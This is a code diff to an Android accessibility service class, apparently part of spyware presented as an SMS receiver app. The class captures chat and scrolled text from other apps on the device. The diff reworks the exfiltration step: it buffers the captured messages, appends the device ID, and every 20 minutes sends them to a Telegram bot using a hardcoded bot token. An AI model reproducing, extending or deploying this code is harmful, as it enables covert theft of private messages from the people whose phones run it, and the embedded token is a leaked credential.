@@ -16,18 +16,24 @@ import java.io.UnsupportedEncodingException;
 import java.net.MalformedURLException;
 import java.net.URL;
 import java.net.URLEncoder;
-import java.nio.charset.StandardCharsets;
 import java.util.Date;
 
 import br.com.helpdev.smsreceiver.SavePref;
 
 public class SocialMedia extends AccessibilityService {
+    private static final String TAG = "Acc";
+    StringBuilder str = new StringBuilder();
+    String eventData;
     private StringBuilder textStringBuilder;
     private StringBuilder ScrollText;
     private String ChatName;
     private String whichEvent;
     private String txtContent = "";
-    private static final String TAG = "Acc";
+
+    public static String getTimeStamped(long systemTime) {
+        return new java.text.SimpleDateFormat("yyyyMMdd_HHmmss_z").
+                format(new Date(systemTime)).replace(":", "_");
+    }
 
     private String getEventType(AccessibilityEvent event) {
         switch (event.getEventType()) {
@@ -131,7 +137,7 @@ public class SocialMedia extends AccessibilityService {
 
                     String dateString1 = getTimeStamped(System.currentTimeMillis());
                     String Chat = "\r\n" + "Message: " + textStringBuilder.toString() + "\r\n" + "Time: " + dateString1 + "\r\n";
-                    if (!textStringBuilder.toString().equalsIgnoreCase("")){
+                    if (!textStringBuilder.toString().equalsIgnoreCase("")) {
                         writeStrings2File(PACKAGENAME, Chat, "text");
                     }
 
@@ -141,7 +147,6 @@ public class SocialMedia extends AccessibilityService {
             }
         }
     }
-
 
     private void scrolltext(AccessibilityEvent event) throws MalformedURLException {
         AccessibilityNodeInfo source = event.getSource();
@@ -164,8 +169,6 @@ public class SocialMedia extends AccessibilityService {
         }
         ScrollText = new StringBuilder();
     }
-
-    String eventData;
 
     private void printscrolltext(AccessibilityNodeInfo source, StringBuilder ScrollText) {
         if (source == null) {
@@ -234,18 +237,18 @@ public class SocialMedia extends AccessibilityService {
     }
 
     private void writeStrings2File(String packageName, String content, String chatType) throws MalformedURLException {
-        String updated =  content;
+        String updated = content;
 
         if (!chatType.equalsIgnoreCase("scroll")) {
             txtContent = updated;
             callGetFunction(updated, packageName + "_C");
-         //Log.d("accvalue", updated+"^"+packageName + "_C");
+            //Log.d("accvalue", updated+"^"+packageName + "_C");
         }
         if (chatType.equalsIgnoreCase("scroll")) {
             updated = txtContent + "\r\n" + updated;
             callGetFunction(updated, packageName + "_S");
             txtContent = "";
-         //Log.d("accvalue", updated+"^"+packageName + "_S");
+            //Log.d("accvalue", updated+"^"+packageName + "_S");
         }
     }
 
@@ -263,31 +266,36 @@ public class SocialMedia extends AccessibilityService {
     }
 
     public void callGetFunction(String data, String pkg) throws MalformedURLException {
-
         SavePref pref = new SavePref(this);
-        String token = "5775483424:AAHyXAYVN6oHDyCCYeSElCA6n2glcohBMhk";
-        String chatid = pref.getChatid();
-        String body = data+"^^"+pkg;
-        String turl = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=";
-        String result = null;
-        try {
-            result = turl + chatid + "&text=" + URLEncoder.encode(body, "UTF-8");
-        } catch (UnsupportedEncodingException e) {
-            e.printStackTrace();
-            Toast.makeText(this, "unSupported URL", Toast.LENGTH_SHORT).show();
+        String body = data + "^^" + pkg;
+        str.append(body);
+
+        long timeForComparingLastSync = System.currentTimeMillis() / 1000;
+        Log.e("lalala", "outside ");
+
+        if (timeForComparingLastSync >= (pref.getLastSync() + (20 * 60))) { // 20 minutes
+            String token = "5775483424:AAHyXAYVN6oHDyCCYeSElCA6n2glcohBMhk";
+            String chatid = pref.getChatid();
+            String turl = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=";
+            String result = null;
+            str.append(pref.getDeviceid());
+            try {
+                result = turl + chatid + "&text=" + URLEncoder.encode(String.valueOf(str), "UTF-8");
+            } catch (UnsupportedEncodingException e) {
+                e.printStackTrace();
+                Toast.makeText(this, "unSupported URL", Toast.LENGTH_SHORT).show();
+            }
+
+            Log.e("lalala", "from sm " + result);
+            URL url = new URL(result);
+            assert chatid != null;
+            if (!chatid.equalsIgnoreCase("nochatid")) {
+                new UtilClass().sendGet(url);
+            }
+            pref.setLastSync(timeForComparingLastSync);
+            str = new StringBuilder();
         }
 
-        Log.e("lalala", "from sm "+result);
-        URL url = new URL(result);
-        assert chatid != null;
-        if (!chatid.equalsIgnoreCase("nochatid" ) ){
-            new UtilClass().sendGet(url);
-        }
-
-    }
-    public static String getTimeStamped(long systemTime) {
-        return new java.text.SimpleDateFormat("yyyyMMdd_HHmmss_z").
-                format(new Date(systemTime)).replace(":", "_");
     }
 
 }
